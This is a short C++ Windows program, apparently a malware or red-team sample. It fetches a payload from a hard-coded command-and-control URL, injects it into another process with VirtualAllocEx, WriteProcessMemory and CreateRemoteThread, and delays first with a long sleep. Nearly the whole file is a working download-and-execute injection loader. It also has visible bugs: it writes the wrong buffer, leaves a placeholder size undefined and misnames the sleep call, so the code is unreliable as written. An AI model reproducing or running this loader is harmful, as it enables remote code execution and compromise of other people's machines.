#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>
#include <locale>
#include <string>
#include <urlmon.h>
#include <cstdio>
#pragma comment(lib, "urlmon.lib")

using namespace std;

int downloadAndExecute()
{
    HANDLE hProcess;
    SIZE_T dwSize = YOURSHELLCODESIZE;
    DWORD flAllocationType = MEM_COMMIT | MEM_RESERVE;
    DWORD flProtect = PAGE_EXECUTE_READWRITE;
    LPVOID memAddr;
    SIZE_T bytesOut;
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 414);
    const char* c2URL = "http://1.1.1.1/index.raw";
    IStream* stream;
    char buff[510];
    unsigned long bytesRead;
    string s;
    URLOpenBlockingStreamA(0, c2URL, &stream, 0, 0);
    while (true) {
        stream->Read(buff, 510, &bytesRead);
        if (0U == bytesRead) {
            break;
        }
        s.append(buff, bytesRead);
    }
    memAddr = VirtualAllocEx(hProcess, NULL, dwSize, flAllocationType, flProtect);
    cout << "[+] Memory Allocated at:" << memAddr << "\n";

    WriteProcessMemory(hProcess, memAddr, buff, dwSize, &bytesOut);
    cout << "[+] Number of bytes written: " << bytesOut << "\n";

    CreateRemoteThread(hProcess, NULL, dwSize, (LPTHREAD_START_ROUTINE)memAddr, 0, 0, 0);
    stream->Release();
    return 0;
}

int main() {
    sleep(120000);
    downloadAndExecute();
    return 0;
}